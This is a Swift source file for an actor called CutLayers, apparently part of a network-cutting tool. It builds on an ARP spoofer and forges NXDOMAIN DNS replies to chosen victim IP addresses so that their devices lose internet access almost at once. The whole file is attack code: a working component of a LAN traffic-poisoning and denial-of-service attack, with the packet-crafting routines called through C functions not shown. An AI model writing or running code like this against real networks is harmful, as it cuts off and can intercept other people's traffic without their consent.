import Foundation

/// Layered cut amplifier on top of the ARP poisoner.
///
/// Once `ARPSpoofer` redirects victim traffic to our MAC at L2, this actor
/// opens a separate pcap handle on the same interface and crafts NXDOMAIN
/// replies for any DNS query the victims send our way. The visible effect on
/// the cut device: DNS resolution fails immediately instead of stalling for
/// 30 seconds — apps surface "no internet" almost instantly.
///
/// Designed to be benign when ARP poisoning doesn't land (zero packets arrive
/// in the BPF filter, pump returns 0, no overhead). Designed to be safe when
/// running on networks where the user uses CoreDNS / DoH locally — only DNS
/// queries from the configured cut victims' source IPs get NXDOMAIN'd, every
/// other DNS packet is left untouched.
actor CutLayers {

    private var handle: OpaquePointer?
    private var pumpTask: Task<Void, Never>?
    private var lastReportAt: Date = .distantPast

    /// Open the cut layer on the current interface. Idempotent — calling twice
    /// without `stop()` between will reuse the handle.
    func start(context: NetworkContext, victims: [String]) {
        if handle == nil {
            var errbuf = [CChar](repeating: 0, count: 256)
            let macBytes = context.selfMAC.bytes
            let h = macBytes.withUnsafeBufferPointer { mp -> OpaquePointer? in
                context.interface.withCString { ic in
                    context.selfIPv4.withCString { ip in
                        wm_cut_open(ic, mp.baseAddress, ip, &errbuf).map(OpaquePointer.init)
                    }
                }
            }
            guard let h else {
                Log.root.error("CutLayers.start: wm_cut_open failed: \(String(cString: errbuf), privacy: .public)")
                return
            }
            self.handle = h
            Log.root.info("CutLayers: opened on \(context.interface, privacy: .public)")
        }
        setVictims(victims)
        if pumpTask == nil {
            let h = handle
            pumpTask = Task.detached(priority: .userInitiated) { [weak self] in
                while !Task.isCancelled {
                    if let h {
                        let n = wm_cut_pump(UnsafeMutableRawPointer(h), 64)
                        _ = n
                    }
                    try? await Task.sleep(nanoseconds: 30_000_000)  // 30 ms
                    await self?.maybeReportStats()
                }
            }
        }
    }

    func setVictims(_ victims: [String]) {
        guard let h = handle else { return }
        // Build a contiguous array of `const char *`. Hold the strdup'd CString
        // buffers alive across the call. The C signature is `const char **`,
        // which Swift bridges as Optional<UnsafePointer<CChar>>.
        var cstrings: [UnsafePointer<CChar>?] = victims.map { ip in
            UnsafePointer(strdup(ip))
        }
        defer {
            for s in cstrings {
                if let s { free(UnsafeMutablePointer(mutating: s)) }
            }
        }
        cstrings.withUnsafeMutableBufferPointer { bp in
            wm_cut_set_victims(UnsafeMutableRawPointer(h),
                               bp.baseAddress,
                               Int32(victims.count))
        }
    }

    func stop() {
        pumpTask?.cancel()
        pumpTask = nil
        if let h = handle {
            wm_cut_close(UnsafeMutableRawPointer(h))
            handle = nil
        }
    }

    private func maybeReportStats() {
        guard let h = handle else { return }
        let now = Date.now
        guard now.timeIntervalSince(lastReportAt) > 5 else { return }
        lastReportAt = now
        var responded: UInt64 = 0
        var seen: UInt64 = 0
        var failed: UInt64 = 0
        wm_cut_stats(UnsafeMutableRawPointer(h), &responded, &seen, &failed)
        Log.root.info("CutLayers: dns seen=\(seen, privacy: .public) responded=\(responded, privacy: .public) failed=\(failed, privacy: .public)")
    }
}
